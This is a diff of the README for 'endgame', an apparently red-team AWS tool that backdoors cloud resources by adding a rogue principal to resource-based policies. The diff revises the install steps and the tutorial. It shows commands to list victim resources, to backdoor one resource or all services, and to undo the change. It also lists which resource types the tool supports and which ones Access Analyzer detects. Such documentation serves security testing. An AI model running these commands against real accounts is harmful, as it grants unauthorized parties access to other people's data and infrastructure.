@@ -37,10 +37,10 @@ endgame smash --service all --evil-principal * --undo --dry-run
 
 ## Installation
 
-* Install
-
 ```bash
-make install
+python3 -m venv ./venv && source venv/bin/activate
+python3 -m pip install -r requirements.txt
+python3 -m pip install -q ./dist/endgame*.tar.gz
 ```
 
 ## Tutorial
@@ -73,25 +73,9 @@ make terraform-demo
 
 > _Note: It is not exposed to rogue IAM users or to the internet at first. That will only happen after you run the exposure commands._
 
-### `list-resources`: List resources to expose
+### List Victim Resources
 
-Help page:
-
-```
-Usage: cli.py list-resources [OPTIONS]
-
-  List AWS resources to expose.
-
-Options:
-  -s, --service TEXT   The AWS service in question. Valid arguments: acm-pca,
-                       ecr, efs, elasticsearch, glacier, lambda, lambda-layer,
-                       cloudwatch, iam, kms, s3, secretsmanager, ses, sns, sqs
-                       [required]
-
-  --profile, --p TEXT  Specify the AWS IAM profile.
-  -r, --region TEXT    The AWS region
-  -v, --verbose
-```
+You can use the `list-resources` command to list resources in the account that you can backdoor.
 
 * Examples:
 
@@ -103,26 +87,15 @@ endgame list-resources -s iam
 endgame list-resources --service s3
 ```
 
-### `expose`: Expose resources by creating backdoors
+### Backdoor specific resources
 
-#### Dry run
-
-* Exploit resources (dry run)
+* Use the `--dry-run` command first to test it without modifying anything:
 
 ```bash
-endgame expose \
-    --service iam \
-    --name test-resource-exposure \
-    --dry-run
+endgame expose --service iam --name test-resource-exposure --dry-run
 ```
 
-It will output the following:
-
-> ![Expose dry run](docs/images/add-myself-dry-run.png)
-
-#### Create backdoor
-
-* Expose resources (🚨this is not a drill🚨)
+* To create the backdoor to that resource from your rogue account (🚨this is not a drill🚨):
 
 ```
 endgame expose --service iam --name test-resource-exposure
@@ -132,15 +105,16 @@ Example output:
 
 > ![Expose for real](docs/images/add-myself-foreal.png)
 
-#### Undo/Remove the backdoor
+* If you want to atone for your sins (optional) you can use the `--undo` flag to roll back the changes.
 
-It will output the following:
+```bash
+endgame expose --service iam --name test-resource-exposure --undo
+```
 
 > ![Expose undo](docs/images/add-myself-undo.png)
 
 
-#### Expose everything
-
+### Expose everything
 
 ```bash
 endgame smash --service all --dry-run
@@ -152,23 +126,23 @@ endgame smash --service all --undo
 
 ### Backdoors via Resource-based Policies
 
-| Backdoored Resource Type      | Support | Access Analyzer Support |
-|-------------------------------|---------|-------------------------|
-| ACM PCA                       | ✅     | ❌                       |
-| CloudWatch Resource Policies  | ✅     | ❌                       |
-| ECR Repositories              | ✅     | ❌                       |
-| EFS File Systems              | ✅     | ❌                       |
-| ElasticSearch Domains         | ✅     | ❌                       |
-| Glacier Vault Access Policies | ✅     | ❌                       |
-| IAM Roles                     | ✅     | ✅                       |
-| KMS Keys                      | ✅     | ✅                       |
-| Lambda Functions              | ✅     | ✅                       |
-| Lambda Layers                 | ✅     | ✅                       |
-| S3 Buckets                    | ✅     | ✅                       |
-| Secrets Manager Secrets       | ✅     | ✅                       |
-| SES Identity Policies         | ✅     | ❌                       |
-| SQS Queues                    | ✅     | ✅                       |
-| SNS Topics                    | ✅     | ❌                       |
+| Backdoored Resource Type      | Support | Access Analyzer Support [1] |
+|-------------------------------|---------|-------------------------    |
+| ACM PCA                       | ✅     | ❌                          |
+| CloudWatch Resource Policies  | ✅     | ❌                          |
+| ECR Repositories              | ✅     | ❌                          |
+| EFS File Systems              | ✅     | ❌                          |
+| ElasticSearch Domains         | ✅     | ❌                          |
+| Glacier Vault Access Policies | ✅     | ❌                          |
+| IAM Roles                     | ✅     | ✅                          |
+| KMS Keys                      | ✅     | ✅                          |
+| Lambda Functions              | ✅     | ✅                          |
+| Lambda Layers                 | ✅     | ✅                          |
+| S3 Buckets                    | ✅     | ✅                          |
+| Secrets Manager Secrets       | ✅     | ✅                          |
+| SES Identity Policies         | ✅     | ❌                          |
+| SQS Queues                    | ✅     | ✅                          |
+| SNS Topics                    | ✅     | ❌                          |
 
 ### Backdoors via Sharing APIs
 
@@ -253,3 +227,4 @@ Note that the `expose` command will not expose the resources to the world - it w
 
 * [Exception handling for specific AWS Services](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/error-handling.html#parsing-error-responses-and-catching-exceptions-from-aws-services)
 
+[1]: https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html
